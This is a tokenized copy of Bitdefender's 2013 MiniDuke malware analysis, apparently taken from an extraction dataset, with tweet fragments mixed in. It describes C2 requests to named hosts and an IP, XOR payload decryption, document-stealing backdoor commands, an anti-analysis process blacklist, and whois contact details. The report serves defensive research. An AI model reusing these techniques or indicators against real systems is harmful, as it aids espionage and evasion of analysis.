["RuthHarper14"], ["I", "was", "appointed", "to", "a", "new", "job", ",", "my", "ID", "for", "CV", "was", "wrong"], ["uri!wp07VkkxYt3Md", "/", "JOnLhzRL2FJv0N9zJnzRNp", "trulrich", "uri!wp07VkkxYmfNkwN2nBmx4ch", "/", "Iu2c+GLeyZEDTKU=", "15", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "zokath", "uri!wp07VkkxYujRoyJ23DkwZ8mRGx6M9yLeyY8m", "/", "Yw48GS", "/", "E2k="], ["2013", "EdithAlbert11"], ["Albert", ",", "my", "cousin", "."], ["He", "is", "working", "hard", "."], ["uri!wp07VkkxYmfNkwN2nBmx4ch", "/", "Iu2c+GJow39HbphL"], ["FontenotHoward"], ["My", "native", "town", "was", "ruined", "by", "tornado", "."], ["uri!wp07VkkxYt3Md", "/", "JOnLhzRL2FJjY8l2It", "TinaPena10"], ["alas", "I", "met", "new", "boy", "uri!wp07VkkxYt3Md", "/", "JOnLhzRL2FJm7Mt7DEWg==", "LorindaRay1"], ["The", "weather", "is", "good", "today", "."], ["Sunny", "!"], ["uri!wp07VkkxYt3Mne5uiDkz4Il", "/", "Iw48Ge", "/", "EWg==", "6.2", "The", "Communication", "Protocol"], ["The", "malware", "performs", "a", "GET", "request", "to", "a", "server", "with", "a", "Base64", "-", "encoded", "string", "that", ",", "if", "decoded", ",", "reads", "the", "following", ":"], ["For", "2011", "samples", ":", "crc32", "country_code", "ComputerName/%USERDOMAIN%", "OS", "major", ",", "minor", ",", "sp_major", ",", "prod_type", ",", "architecture(32/64bit", ")"], ["antivirus_list", "proxy_list", "version", "(", "the", "version", "of", "the", "malicious", "sample", ")"], ["All", "values", "are", "split", "with", "\u201d", "|", "\u201d", "."], ["The", "entire", "string", "is", "encoded", "in", "Base64", "."], ["For", "2012/2013", "samples", ":"], ["These", "samples", "send", "additional", "data", ",", "such", "as", "the", "system", "username", "."], ["Another", "significant", "change", "is", "the", "fact", "that", "the", "malware", "encodes", "the", "text", "using", "XOR", "and", "a", "key", "that", "results", "from", "SHA-1", "hashing", "of", "the", "Google", "identifier", "."], ["The", "resulting", "buffer", "is", "then", "encoded", "with", "Base64", "."], ["This", "is", "a", "practical", "example", "of", "the", "GET", "request", ":", "?", "a", "=", "MjIzMTQyMzkzM3xST3xIT01FL0hPTUV8NXwxfDN8MXwwfC18LXwyLjEy&g", "=", "MjIzMTQy", "M."], ["The", "variables", "names", "in", "the", "GET", "requests", "are", "randomly", "-", "picked", "."], ["The", "second", "variable", "holds", "a", "CRC", "modulo", "13D455h", "on", "the", "encoded", "string", "."], ["The", "server", "responds", "with", "a", "GIF", "file", "that", "holds", "either", "a", "DLL", "or", "an", "EXE", "file", "."], ["16"], ["\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "6.3", "Adding", "Modules", "and", "Updates"], ["After", "a", "request", "is", "sent", "to", "the", "C2", ",", "the", "malware", "receives", "a", "file", "with", "a", ".GIF", "header", "."], ["This", "is", "usually", "a", "valid", "image", "that", "has", "appended", "to", "it", "a", "payload", "or", "an", "update", "in", "an", "encrypted", "form", "."], ["The", "malware", "checks", "for", "the", "\u2018", "GIF8", "\u2019", "magic", "at", "the", "beginning", "of", "the", "file", "and", "looks", "for", "the", "0x3b00", "word", "."], ["If", "the", "pattern", "is", "found", ",", "the", "malware", "isolates", "the", "next", "four", "bytes", "that", "actually", "represent", "the", "decryption", "key", ",", "followed", "by", "the", "encrypted", "payload", "."], ["Next", ",", "the", "digital", "signature", "is", "verified", "and", "then", "the", "payload", "is", "decrypted", "."], ["If", "it", "is", "a", "DLL", "file", ",", "it", "attempts", "to", "load", "it", "via", "LoadLibrary", "(", ")", ";", "if", "it", "is", "an", "EXE", "file", ",", "it", "gets", "written", "on", "disk", "with", "one", "of", "the", "following", "names", ":", "winupdt.exe", ",", "wcsntfy.exe", ",", "netmngr.exe", ",", "dumpreport.exe", ",", "taskhosts.exe", ",", "wupdmngr.exe", ",", "winhlp.exe", ",", "dllhosts.exe", ",", "dxdiagupd.exe", ",", "dialers.exe", ",", "netschd.exe", ",", "connwiz.exe", ",", "certupdt.exe", ",", "repfault.exe", ",", "wuapreport.exe", ",", "lanmgr.exe", "."], ["The", "file", "is", "then", "executed", "."], ["The", "GIF", "file", "is", "digitally", "signed", "with", "RSA", "2048bit", "."], ["The", "signature", "is", "located", "at", "the", "end", "of", "the", "GIF", "file", "and", "uses", "SHA-1", "."], ["This", "mechanism", "ensures", "that", "the", "updates", "are", "\u201c", "legit", "\u201d", "and", "prevents", "an", "outsider", "from", "pushing", "a", "fake", "update", ".", "6.4"], ["The", "Encryption", "Algorithm", "for", ".GIF"], ["Files"], ["The", "encryption", "algorithm", "for", "these", "GIF", "files", "is", "a", "simple", "XOR", "operation", "with", "a", "key", "that", "rotates", "on", "each", "step", "//", "the", ".gif", "file", "buf", "=", "read_file", "(", "...", ")", "//", "looking", "for", "the", "index", "where", "the", "pattern", "starts"], ["i", "=", "idx_find_pattern", "(", ")", "//", "decrypting", "the", "data", ",", "the", "last", "0x100", "bytes", "do", "n\u2019t", "belong", "to", "the", "payload", "for", "j", "in", "range(i", ",", "size", "-", "0x100", "):", "decrypt", "=", "decrypt", "+", "chr(ord(buf[j", "]", ")", "^"], ["(", "key", "&", "0xff", ")", ")"], ["key", "=", "rold(key", ",", "4", ")", "6.5", "Missing", "information"], ["The", "C&C", "located", "at", "http://hottraveljobs.com/forum/docs/info.php", "holds", "a", "list", "that", "resembles", "log", "files", "."], ["There", "are", "approximately", "60", "entries", "which", "we", "believe", "are", "information", "about", "the", "targets", "."], ["Since", "we", "know", "the", "form", "of", "the", "data", "sent", "over", "to", "Command", "and", "Control", "centers", ",", "we", "might", "be", "able", "to", "get", "the", "format", "for", "the", "logs", "."], ["The", "format", "is", "<", "CRC>|base64|<size>|<md5", ">", "."], ["The", "CRC", "is", "a", "decimal", "representation", ",", "while", "the", "<", "size", ">", "field", "can", "represent", "the", "size", "of", "a", "payload", "sent", "to", "the", "respective", "target", "."], ["The", "<", "md5", ">", "-", "value", "may", "be", "the", "MD5", "hash", "of", "the", "payload", "."], ["17", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Example", "25479421", "84|", "4mBwdmBzEaXtEGJSE10Z4mgVEuNV4mBXECt7", "gwtgf7EgGBbaHbAs7B7G7Bt0FnlFk17Z", "4hTuk1bZ4Ct", "EiHEU9wEsIoFLgW7mjh3pjCNLfhEuIHzViHbRJwTrk1cS4G3Z4mFS4GAS4mAt4hTtE1PueGPVeF==", "|0", "|0", "24194643", "63|", "EucSE6XtEGASE10Z4mFteGFWE14W4wt7gwt1GVzG7gTrgB4sF", "Vxegv74", "d7", "01k1IZ4hTtk1bZ4htbgV7"], ["gcBz5f14", "UcBbSj2nWih3vJUA", "Vdm3ZdhTUdmB", "Uk1cVdmBT", "dmcT4GbZ4GBY4mcY4mN=", "|150948", "|c026fbffeed6155b", "f1", "86abedb8681257", "If", "the", "two", "fields", "at", "the", "end", "are", "really", "representations", "for", "<", "size", ">", "and", "md5", ",", "then", "we", "may", "have", "24", "different", "binary", "files"], ["(", "see", "the", "Appendix", "C", ":", "Possible", "MD5", "hashes", "for", "payloads", "section", "\u2193", ")", "."], ["No", "files", "in", "the", "list", "could", "be", "found", "by", "their", "corresponding", "MD5", "."], ["7", "."], ["Malware", "Versions"], ["Each", "sample", "of", "the", "malware", "comes", "with", "a", "version", "number", "hardcoded", "in", "the", "binary", "."], ["Different", "versions", "are", "usually", "linked", "to", "a", "different", "Twitter", "account", "."], ["The", "vast", "number", "of", "versions", "indicates", "intense", "activity", ",", "but", "only", "a", "limited", "number", "of", "samples", "are", "known", "."], ["The", "timestamp", "is", "isolated", "from", "the", "sample", "\u2019s", "PE", "header", "and", "represents", "the", "moment", "in", "which", "the", "executable", "file", "has", "been", "linked", "."], ["Although", "it", "can", "be", "usually", "spoofed", ",", "we", "believe", "it", "is", "real", ",", "as", "we", "were", "able", "to", "correlate", "it", "with", "the", "moment", "we", "received", "each", "of", "the", "samples", "."], ["2011", "2011/06/20"], ["-", "0.1", "-", "ObamaApril", "2011/10/13", "-", "2.12", "\u2013", "etoursinfo"], ["For", "the", "2011", "timeframe", ",", "we", "have", "two", "samples", "."], ["The", "one", "linked", "with", "the", "ObamaApril", "Twitter", "handle", "-", "malware", "version", "0.1", "-", "appears", "to", "be", "the", "oldest", "sample", "."], ["The", "jump", "to", "version", "2.12", "can", "not", "be", "justified", ",", "and", "we", "believe", "that", "there", "are", "a", "number", "of", "missing", "samples", ",", "which", "makes", "year", "2011", "one", "of", "the", "most", "active", "periods", "for", "this", "family", "of", "malware", "."], ["However", ",", "one", "could", "also", "speculate", "that", "the", "versions", "do", "not", "follow", "a", "strict", "order", "."], ["2012", "2012/05/14", "-", "6.66", "-", "trulrich", "2012/05/21", "-", "5.21", "-", "trulrich", "2012/05/23", "-", "6.67", "-", "zokath", "2012/06/06", "-", "6.06", "-", "tonyafordy", "2012/09/04", "-", "0.49", "-", "CurtinDiana", "2012/12/26", "-", "3.13", "-", "RuthHarper14"], ["For", "year", "2012", ",", "there", "are", "a", "number", "of", "different", "versions", ",", "although", "we", "do", "n\u2019t", "know", "if", "they", "follow", "a", "strict", "order", "or", "not", "."], ["For", "instance", ",", "version", "3.13", "was", "released", "in", "December", ",", "while", "version", "5.21", "was", "spotted", "in", "May."], ["It", "is", "possible", "that", "the", "servers", "hosting", "the", "samples", "to", "have", "run", "out", "of", "sync", "."], ["This", "would", "explain", "why", "lower", "versions", "have", "shown", "up", "in", "December", "."], ["18", "\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "2013", "2013/02/12", "-", "1.05", "-", "TinaPena10", "2013/02/20", "-", "1.10", "-", "LorindaRay1", "2013/02/20", "-", "1.12", "-", "EdithAlbert11", "2013/02/20", "-", "1.13", "-", "FontenotHoward", "2013/02/21", "-", "1.10", "-", "LorindaRay1", "2013/02/21", "-", "1.12", "-", "EdithAlbert11", "2013/02/21", "-", "1.13", "-", "FontenotHoward", "2013/02/21", "-", "1.16", "-", "JennieCartagena", "2013/02/26", "-", "1.20", "-", "KellyPalmer20"], ["The", "versions", "released", "in", "2013", "follow", "a", "much", "stricter", "order", "."], ["Every", "subversion", "of", "the", "malware", "comes", "with", "a", "separate", "Twitter", "handle", "."], ["Quick", "math", "shows", "that", "there", "are", "at", "least", "20", "Twitter", "accounts", "that", "have", "been", "used", "in", "the", "attacks", "throughout", "2013", "(", "or", "at", "least", "until", "February", "26th", ",", "the", "date", "of", "the", "discovery", ")", "."], ["8", "."], ["Anti", "-", "Reverse", "Techniques"], ["The", "first", "defense", "mechanism", "to", "prevent", "analysis", "is", "the", "presence", "of", "the", "watermark", "."], ["The", "binary", "file", "wo", "n\u2019t", "properly", "run", "on", "a", "different", "machine", ",", "since", "the", "data", "inside", "the", "malware", "would", "be", "decrypted", "improperly", "."], ["Other", "techniques", "to", "prevent", "data", "decryption", "are", "present", "inside", "the", "binary", ":", "\uf0b7", "\uf0b7", "\uf0b7", "Running", "software", "used", "for", "reverse", "engineering", ":", "OllyDbg", ",", "IDA", ",", "Process", "Monitor", "etc", "."], ["Running", "the", "binary", "in", "virtual", "machines", ":", "VMWare", "and", "VirtualBox", "."], ["Breakpoints", "added", "to", "the", "code", "or", "code", "alteration", "(", "hardware", "breakpoints", "need", "to", "be", "used", "instead", ")", "."], ["The", "malware", "also", "monitors", "for", "signs", "of", "user", "interaction", ",", "a", "common", "technique", "used", "for", "antiemulation", "and", "anti", "-", "automated", "malware", "analysis", "."], ["Another", "important", "aspect", "for", "versions", "in", "2012", "and", "2013", "is", "the", "fact", "that", "the", "malware", "does", "not", "trigger", "right", "after", "installation", ",", "but", "rather", "wait", "for", "a", "system", "restart", "to", "execute", "its", "main", "code", "."], ["19", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "9", "."], ["Payload", ":", "Backdoor", "9.1", "Samples"], ["These", "are", "the", "MD5", "hashes", "for", "the", "droppers", "."], ["The", "date", "is", "collected", "from", "the", "PE", "file", "header", "of", "the", "backdoor", "in", "the", "droppers", ":", "1e1b0d16a16cf5c7f3a7c053ce78f515", ",", "2012", "-", "03", "-", "05", "b029378966d2694f8abd51f0d6c7822a", ",", "2012", "-", "06", "-", "15", "53db085a276ebbf5798ba756cac833ea", ",", "2013", "-", "02", "-", "22", "9.2"], ["The", "Loader"], ["The", "loader", "decodes", "the", "information", "in", "the", ".data", "section", "with", "the", "UCL", "algorithm", ",", "then", "passes", "control", "to", "the", "decrypted", "code", "."], ["This", "piece", "of", "code", "holds", "a", "small", "loader", "stub", ",", "followed", "by", "an", "executable", "file", "which", "is", "the", "backdoor", "itself", "."], ["The", "stub", "overwrites", "the", "memory", "image", "of", "the", "original", "executable", "file", "with", "the", "backdoor", "so", "it", "is", "never", "written", "on", "disk", "."], ["The", "malware", "also", "creates", "the", "following", "key", "in", "the", "Registry"], ["HKCU\\Software\\Microsoft\\ApplicationManager", "with", "a", "value", "of", "AppID", "=", "<", "random", ">", "(", "the", "value", "is", "generated", "via", "the", "GetTickCount", "(", ")", "function", ")", "."], ["Malware", "then", "waits", "in", "a", "loop", "and", "performs", "requests", "to", "info.leveldelta.com"], ["Example", ":", "GET", "/php", "/", "text.php?i", "=", "gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj"], ["Accept", ":", "*", "/", "*"], ["User", "-", "Agent", ":", "Mozilla/4.0", "Host", ":", "info.leveldelta.com"], ["The", "base64", "value", "in", "the", "request", "is", "a", "30", "-", "byte", "buffer", "derived", "from", "AppID", "and", "GetTickCount", "(", ")", "and", "is", "always", "different", "."], ["We", "believe", "that", "it", "is", "used", "as", "an", "identifier", "."], ["If", "it", "gets", "a", "response", "from", "the", "server", ",", "the", "malware", "performs", "a", "series", "of", "validations", "and", "execute", "the", "received", "commands", "."], ["The", "responses", "are", "sent", "via", "POST", "and", "contain", "the", "identifier", "from", "the", "GET", "request", ",", "followed", "by", "the", "command", "\u2019s", "result", "."], ["This", "is", "the", "way", "the", "malware", "exfiltrates", "documents", "from", "the", "target", "computers", "."], ["9.3", "Backdoor", "commands", "mv", "-", "Moves", "a", "file", "."], ["Uses", "MoveFileA", "api", "."], ["cp", "-", "Copies", "a", "file", "."], ["Uses", "CopyFileA", "api", "."], ["rm", "-", "Deletes", "a", "file", "."], ["Uses", "DeleteFileA", "api", "."], ["pwd", "-", "Gets", "current", "dir", "."], ["Uses", "GetCurrentDirectoryA", "api", "."], ["cd", "-", "Sets", "current", "dir", "."], ["Uses", "SetCurrentDirectoryA", "api", "."], ["rmdir", "-", "Removes", "dir", "."], ["Uses", "RemoveDirectoryA", "api", "."], ["mkdir", "-", "Creates", "a", "dir", "."], ["Uses", "CreateDirectoryA", "api", "."], ["pskill", "-", "Kills", "process", "."], ["Uses", "OpenProcess", ",", "TerminateProcess", "apis", "."], ["20", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "exew", "-", "Create", "a", "process", "."], ["Uses", "CreateProcessA", "api", "."], ["conf", "-", "Gets", "some", "configuration", "data", ",", "creates", "a", "string", "\"", "i", "d", ":", "0x%08X\\char", "`", "host", ":"], ["info.leveldelta.com\\", "port", ":", "%", "d\\", "delay", ":", "%", "d\\", "\u201d", "cdt", "-", "Change", "to", "TEMP", "dir", "."], ["Uses", "GetTempPathA", ",", "SetCurrentDirectoryA", "APIs", "."], ["dev", "-", "Returns", "the", "list", "of", "drives", "in", "the", "system", "with", "their", "type", "(", "fixed", ",", "removable", ",", "etc", ")", "."], ["The", "following", "strings", "are", "used", "for", "their", "types", ":", "unk", ",", "nrt", ",", "rmv", ",", "fix", ",", "net", ",", "cdr", ",", "ram", ",", "und", "."], ["Uses", "GetLogicalDriveStringsA", ",", "GetDriveTypeA", "apis", "."], ["time", "-", "Gets", "the", "number", "of", "hours", "since", "the", "system", "was", "started", ":", "\"", "uptime", "%", "5d.%02dh", "\u201d", "."], ["Uses", "GetTickCount", "api", "."], ["info", "-", "Gets", "info", "about", "system", "."], ["String", "generated", "like", ":", "\"", "%", "d", "%", "s\\n%s\\", "%", "s\\", "\"", "using", "GetCurrentProcessId", ",", "GetModuleFileNameA", ",", "GetComputerNameA", ",", "GetUserNameA", "apis", "."], ["exit", "-", "\"", "exiting", "...", "\"", "dir", ",", "ls", "-", "List", "files", "in", "current", "dir", "."], ["Uses", "FindFirstFile", "(", "\"", "*", "\"", ")", ",", "FindNextFile", "apis", "."], ["exeu", "-", "CreateProcessWithLogonW", "and", "reads", "data", "from", "pipe", "."], ["ecec", "-", "CreateProcessA", "and", "read", "data", "from", "pipe", "."], ["put", "-", "Writes", "file", "on", "disk", "from", "internal", "buffer", "."], ["Uses", "CreateFileA", ",", "WriteFile", "apis", "."], ["get", "-", "Reads", "a", "file", "in", "chunks", "of", "0x400", "bytes", "and", "computes", "SHA1", "on", "them", "."], ["ps", ",", "pslist", "-", "Gets", "info", "about", "processes", "and", "their", "modules", "."], ["Uses", "EnumProcesses", ",", "OpenProcess", ",", "EnumProcessModules", ",", "GetModuleFileNameExA", "apis", "."], ["9.4", "Servers"], ["We", "have", "identified", "two", "servers", "used", "in", "the", "attack", "(", "sample", "md5", "/", "timestamp", "/", "server", "):", "1e1b0d16a16cf5c7f3a7c053ce78f515", ",", "2012", "-", "03", "-", "05", "news.grouptumbler.com/news/feed.php", "b029378966d2694f8abd51f0d6c7822a", ",", "2012", "-", "06", "-", "15", "info.leveldelta.com/php/text.php", "53db085a276ebbf5798ba756cac833ea", ",", "2013", "-", "02", "-", "22", "info.leveldelta.com/php/text.php"], ["Whois", "information", "on", "news.grouptumbler.com"], ["Registrant", "Contact", ":", "Grouptumbler", "."], ["COM"], ["Tim", "K.", "Lappin", "(", ")"], ["Fax", ":", "4573", "Froe", "Street", "Bluefield", ",", "WV", "24701", "Bluefield", ",", "WV", "24701"], ["US", "4573", "Froe", "Street", "Bluefield", ",", "WV", "24701", "Bluefield", ",", "WV", "24701", "Whois", "information", "on", "info.leveldelta.com"], ["Registrant", "Contact", ":", "Abdul", "Kasim", "(", ")", "21", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Fax", ":", "1442", "Sokak", "No", "49"], ["Izmir", ",", "IZMIR", "35432"], ["TR", "1442", "Sokak", "No", "49"], ["Izmir", ",", "IZMIR", "35432"], ["TR", "10", "."], ["Payload", ":", "Turkish", "Backdoor", "10.1", "Sample"], ["626489f8cafacb1b24fe6ecf0db52f23", "-"], ["The", "received.gif", "file", ",", "named", "3979106736.gif"], ["6bc34809e44c40b61dd29e0a387ee682", "-", "The", "variant", "decrypted", "from", "the", ".gif", "file"], ["Observations", ":", "clean", "code", ",", "generated", "by", "the", "compiler", "and", "no", "obfuscation", "."], ["The", "file", "does", "not", "have", "version", "information", "or", "digital", "signature", "."], ["10.2"], ["Modus", "Operandi"], ["The", "malware", "checks", "to", "see", "if", "the", "host", "computer", "connects", "to", "the", "Internet", "through", "a", "proxy", "server", "."], ["If", "set", ",", "the", "malware", "uses", "the", "proxy", "settings", "."], ["Regardless", "of", "the", "connection", "method", ",", "the", "malware", "connects", "to", "85.95.236.114:443", "using", "sockets", "."], ["It", "creates", "an", "unique", "identifier", "(", "DWORD", "size", ")", ",", "from", "the", "socket", "handle", "."], ["Everything", "is", "encrypted", "with", "XOR", "and", "a", "value", "of", "an", "address", "on", "the", "stack", "."], ["It", "sends", "the", "identifier", "on", "the", "opened", "socket", "."], ["It", "receives", "16", "bytes", "from", "the", "socket", ",", "and", "creates", "a", "MD5", "hash", "on", "these", "."], ["The", "MD5", "hash", "will", "be", "used", "as", "key", "for", "the", "AES", "algorithm", "."], ["It", "receives", "16", "bytes", "used", "for", "AES", "encryption", "as", "initialization", "vector", "."], ["It", "receives", "4", "bytes", ",", "it", "performs", "a", "XOR", "operation", "with", "the", "identifier", "and", "allocates", "memory", "as", "follows", ":", "malloc(val", "XOR", "user_id", ")"], ["It", "receives", "a", "number", "of", "size", "bytes", ",", "decrypts", "them", "with", "AES", "and", "calls", "the", "start", "of", "the", "decrypted", "buffer", "."], ["The", "payload", "can", "be", "used", "to", "load", "new", "modules", "."], ["The", "received", "code", "needs", "to", "be", "completely", "relocatable", "as", "the", "main", "piece", "of", "malware", "."], ["Using", "this", "technique", ",", "the", "attackers", "may", "introduce", "malicious", "code", "that", "will", "never", "be", "saved", "on", "disk", ",", "but", "rather", "executed", "directly", "from", "memory", "."], ["We", "could", "also", "presume", "that", "some", "payloads", "have", "been", "exclusively", "delivered", "via", "this", "channel", "and", "ca", "n\u2019t", "be", "recovered", "for", "forensic", "investigation", "because", "they", "never", "made", "it", "on", "the", "disk", "drive", "."], ["22", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Information", "about", "85.95.236.114"], ["Location", ":", "Turkey", "Izmir", "Inetmar", "Internet", "Hizmetleri", "San", "."], ["Tic", "."], ["Ltd."], ["Sti", "ASN", ":", "AS49467", "INETMAR", "INETMAR", "Internet", "Hizmetleri", "Autonomous", "System", "(", "izmir", ")", "(", "registered", "Jun", "15", ",", "2009", ")"], ["Contact", ":", "person", ":", "Deniz", "Tosun", "org", ":", "ORG", "-", "IiHS1", "-", "RIPE", "address", ":", "1370", "sok", "."], ["NO:42", "Yalay", "Is", "Merkezi", "Kat:4/406", "address", ":"], ["Montro", "/", "Konak", "/", "IZMIR"], ["Country", ":", "TR", "23", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Appendix", "A", ":", "Process", "Blacklist", "apispy32.exe"], ["apimonitor.exe", "winapioverride32.exe", "procexp.exe", "procmon.exe", "filemon.exe", "regmon.exe", "winspy.exe", "wireshark.exe", "dumpcap.exe", "tcpdump.exe", "tcpview.exe", "windump.exe", "netsniffer.exe", "iris.exe", "commview.exe", "ollydbg.exe", "syser.exe", "idag.exe", "idag64.exe", "petools.exe"], ["vboxtray.exe", "vboxservice.exe", "vmwaretray.exe", "vmwareuser.exe", "Appendix", "B", ":", "Possible", "channels", "used", "for", "C&C", "index.htm", "main.htm", "default.htm", "home.htm", "out.htm"], ["click.htm", "link.htm", "page.htm", "browse.htm", "directory_home.htm"], ["portal.htm", "info.htm", "current.htm", "details.htm", "24", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "search.htm", "article.htm", "Appendix", "C", ":", "Possible", "MD5", "hashes", "for", "payloads"], ["01c59a7a5612f90cd8f52a30c1b0ec4e", "09ac651a422e03eba9c169c218c4aac6", "116d759a7cc530826e96be46803efa30", "1679a28e3fc3cc9554fbb4f0fa8705f4", "18132ea533919353a949d92df46d752b"], ["4ea816a1b0e91b22c6d25cee4f4fde3c"], ["67acf4072e451052d633dad9c8420eb4", "719ea5175cf17b28c0ff0958179409cf"], ["92a6385eeb0cefcabd557f29b169dec7", "ac9f826f81c0dae043fa7045f7ec0ec8", "b510b040e789d6d5f1ce4c5537970756", "bb0318de92a47c2f2637f48217ab1be2", "bd68fdba01b19e45a75beb14dfb7d76e", "c026fbffeed6155bf186abedb8681257", "c4a28bd80fda44e043b78db596e9602e", "c660a74a189103bd0ceee8bdbd21571c", "ded0c5cd0afa8419e85b2b79cefa806a", "e1409964532d1a011de2198f0565cba1"], ["e18d275072c0f1fc295f43e1d65c9936", "e57db4833fc457f76d292fe798324902", "f20ff2c43ea7a24252359007cb182444", "f3d8f1aca7e18126e4651f1da84adacb", "f894fabe444a0e5f8416e39eead49df2", "fe389fba6fb5876aca797bcf0cf8fb98", "25", "\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Appendix", "D", ":", "E", "-", "Mail", "samples", "used", "in", "attacks", "Figure", "3", ":", "The", "e", "-", "mail", "bundled", "with", "the", "infected", "PDF", "file", "26", "\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Appendix", "E", ":", "Twitter", "accounts", "27", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "28", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Appendix", "F", ":", "Forged", "documents", "29", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "30", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "31", "\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "32", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "33", "\u00a9", "2013"], ["Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "Appendix", "G", ":", "Samples", "by", "Year"], ["These", "are", "the", "MD5", "checksums", "of", "the", "main", "components", ",", "but", "not", "payloads", ",", "droppers", "or", "PDF", "files", "."], ["2011", "2013", "(", "continued", ")"], ["1c658719e6dedb929a6d85359c59682d", "975e0ebd25b52dad0dd75d7cf01baa4b", "3db113b082fdcad366ef70aaeb4c42a2", "41501aa706de0e972fe043411da211fc"], ["424808b168d3d5d7bba77757177e70df", "4932b2c4a629d2783d0927a4b4a2c678", "4aee487d0bf88cc12e277b0f275a90d5"], ["4b07a3ba46928b361132d043ced489ad", "4eeead5b15e3d93229c185db5abb951a", "509c8e389f293e4beaa18d425cc89475"], ["51541ea6f5706dbf7598630de87c2cad"], ["525bb2d9db67c22cc60172893ce657ac", "527537cc28705e01af8d8006ae8308a9", "527de10f536a842a4265532c38b6dbdd"], ["57446317cf90ed2ca7fa0280fadedc01"], ["5a97e7548fe118a4f829234828bd4621", "5c1b0c783cbaae684a9600813a1ae392", "633d5a729b73f2555c2dc0a8164bbda0", "6942f1dfd61d231df8acb7ed0f6310c4", "6a6c631a6c2194b9805359cd64ae778d", "71ed4557ce864149e9e2863cd8e9b7af", "7223245f43dfd77b2b600603f712804d", "76642f61d20345ef04a52cff47e87795"], ["810de1b9fa0a9396acae23dcd113a60d", "81460a40d27b9d9671dcecb3ddcbdb8f", "898315f60b4afd952fb40e8b3a9cc915", "8b423c8b0522e09ffab2df7e38eea15f"], ["8bf5f1ce970d23d3bb27b3a569023561"], ["9d4923a284db404fcfe6deb664e6cb32"], ["9da1c9280caeecb0e14e89fd51b4c995"], ["a2dd811a8535db4026eaefb6469bb8ff", "a5bc1dfbf1623b3c236f6c429f249ff1", "ac492dd093a404f89554ce55800e2685", "af74866f044fd10dc761f509ff743cd7", "b17426c0eedc296b0c752db11ec52c82", "b876837b7482fd68503247fbf2277840", "bcdaee523dd9df6e68088da412ed1a50", "c6d810b921c7c4690ffbd3f71b837690", "c72e74b914428f1a18ba2ef1c6a737e4", "c786a4cdfe08dbe7c64972a14669c4d1", "c91e5d73d2b6af9b53f4092b82f254cd", "c96ccb992ad128841b1ccc5b41a70ab3", "cf33c3e61f35f1c721bcefda8dfd2963"], ["d2209cb468db8e225712908c7b170eb5", "d87adb9dbffc9af9995d24576b6b0cb3"], ["d89eadb030bfda71d4784a9c5407dcc1", "dca37dff4cb484d2dc1716b39ab58340", "2012", "1de51ec5d2b8466f0d424e1c8dcd6454", "2e9e0b7c6b9fe90ab3249878a282f3d1", "423bb8914078a587d08b54d16bbd527c", "45865a33d868c28377f93467726ccd83", "4c9facc41d9432d11940afeaefeb0ce3"], ["561017f887865b8d13f85c5474cdcbb8"], ["5cd1451579ef46c9a768df302d2c8955"], ["612fba96383a5098c26fe1a222e1e755"], ["73931351f883cff5dbdcc54cc4eb10a7", "74593127f50abff5327b3f7038b456d2", "753737a255c7567fc5c6175373904a84", "8d3542af992b1de4cf1f587f61dddb50", "9f13dc03904dbd45374acc2134477273", "a8f8e87df1ac4453dc6aa65daca9b97d"], ["ded2f80457aaefe1a80a9cefd1f4645d", "e48fb57ce3d9c56ca3cf6c4aed8ad0ea", "ff83dad77ac2b526849930f1860dfd3f", "2013"], ["016536ed5276115a4ed72261eae073cd", "0348458ddab87f5296191f08b01f842d"], ["0b346e73f0f1483ec129be14e665f174", "0dc58bc19e00bd8fee96a989c145f9b1"], ["0e132f3486ded4dd5f8072c56218a6a7", "0efa05d6d817bcada9a82dbbcb4e7c88", "0f79a1453489123ce610835732bc14d3"], ["124cf2d29ace0f1b92d23840f7d15467", "172c36b5d0e4359b3cc7e2a54da4333c", "1d83e0481f0f352551f501cc9fd16de0", "20b4a6c42f1abf7a73ed64beb495ea7a"], ["20e28d848daabd4369041d911fd7a79b"], ["243837bbfa122a8a472faa02596d15d1", "2528957b58ffaba591057d2416fe2226"], ["2530f54b87508e6f09a6bc5ab863b5db", "319df3a37d6c1325272d3234c52f6024", "33335319c246c3ae5844e3d1be93644d"], ["3442005846b16a96c081af5362f8ffaa", "3886a408c917b0cf377c3b99899da942"], ["3d556b7236b8fbc3e52ae1719c31bf7e", "34", "\u00a9", "2013", "Bitdefender", "A", "Closer", "Look", "at", "MiniDuke", "dd171802c25fae5b75fdcbafb353fc3f", "de3e248a564b661fadc9752b2aadffc4"], ["e1cd68f4775e46ecad342c2fef4222db", "e29d75363204595ac729ba63a046e70b", "e863737773f64498091cd775c7abde66", "ea68bf40c2ba2fa3368287ca661bae7e", "eded5be7e464bdbd05b18bfa10bea1fc", "efa40e62ee5bcecaa2f42854bdc70e94", "f1551fb70613cf4820acbb1eef470284", "fedbe9853064a5affe17e98066376bde", "35", "\u00a9", "2013", "Bitdefender"]]}, {"vertexSet": [[{"name": "Trojan.APT.BaneChant", "pos": [0, 3], "sent_id": 0, "type": "TrojanHorse"}], [{"name": "Islamic Jihad.doc", "pos": [10, 12], "sent_id": 5, "type": 